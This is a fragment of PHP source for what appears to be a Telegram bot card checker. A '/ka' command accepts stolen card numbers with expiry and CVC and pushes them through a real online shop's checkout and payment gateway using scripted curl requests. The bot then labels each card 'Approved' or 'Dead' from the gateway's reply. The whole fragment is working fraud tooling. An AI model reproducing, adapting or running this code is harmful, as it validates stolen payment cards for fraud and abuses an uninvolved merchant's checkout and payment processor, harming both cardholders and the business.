...
if(cCmd($msg['text'], ['/ka', '/Ka', '/kA', '/KA', '!ka', '!Ka', '!kA', '!KA', '.ka', '.KA', '.kA', '.Ka'])){
...
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️ -» <code>".$charged."</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/ka cc|month|year|cvc</code>",
...
$qu = 82;
/*=====  url  ======*/
$site = "https://sistaco.ca/collections/refills/products/dual-applicator";
$url = explode("/", $site)[2];
/*=====  1REQ  ======*/
$ch = curl_init();
...
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"form_type":"product","utf8":"✓","option-0":"Pack of 1","id":"35735248011416","quantity":"1"}');
...
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'attributes%5Bcollection_mobile_items_per_row%5D=&attributes%5Bcollection_desktop_items_per_row%5D=&updates%5B%5D=1&discount=&checkout=');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r2 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$atv2.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=72825438391&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bpost_purchase_page_requested%5D=1&checkout%5Btotal_price%5D=900&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=360&checkout%5Bclient_details%5D%5Bbrowser_height%5D=621&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$coki.'.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$coki.'.txt');
$r9 = curl_exec($ch);
sleep(5);
...
elseif($msg2 == "Decline for CVV2 Failure"){
$status = "Approved! ✅ -» ccn";
$status1 = "Decline for CVV2 Failure";
}
else{
$status = "Dead! ❌";
$status1 = "$msg2";
